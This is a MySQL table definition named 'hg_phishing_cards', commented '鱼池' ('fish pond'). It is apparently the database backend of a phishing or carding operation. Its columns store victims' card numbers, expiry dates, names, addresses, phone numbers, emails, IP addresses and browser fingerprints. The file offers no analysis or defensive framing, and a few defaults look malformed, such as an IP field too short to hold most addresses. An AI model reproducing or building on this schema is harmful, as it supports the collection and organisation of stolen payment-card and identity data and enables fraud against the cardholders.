create table hg_phishing_cards
(
    id          bigint auto_increment comment 'ID'
        primary key,
    card_no     varchar(20)                not null comment '卡号',
    card_year   varchar(4)  default '1'    null comment '过期年份',
    card_month  varchar(2)                 null comment '过期月份',
    card_holder bigint                     null comment '卡持有人',
    first_name  varchar(20)                null comment '持有人名',
    last_name   varchar(20)                not null comment '持有人姓',
    telphone    varchar(15)                null comment 'telphone',
    country     varchar(20)                null comment '国家',
    state       varchar(20)                null comment '省/州',
    city        varchar(20)                null comment '城市',
    postal_code varchar(10)                null comment '邮编',
    address     varchar(50)                null comment '地址',
    address2    varchar(50) default '0.0'  null comment '地址2',
    ip_address  varchar(10) default '0.00' not null comment 'ip地址',
    fingerprint varchar(100)               null comment '浏览器指纹',
    email       varchar(60) default ''     null comment '邮箱',
    remark      varchar(255)               null comment '备注',
    status      tinyint(1)  default 1      null comment '状态',
    created_by  bigint      default 0      null comment '创建者',
    updated_by  bigint      default 0      null comment '更新者',
    created_at  datetime                   null comment '创建时间',
    updated_at  datetime                   null comment '修改时间',
    deleted_at  datetime                   null comment '删除时间'
)
    comment '鱼池' charset = utf8mb4;

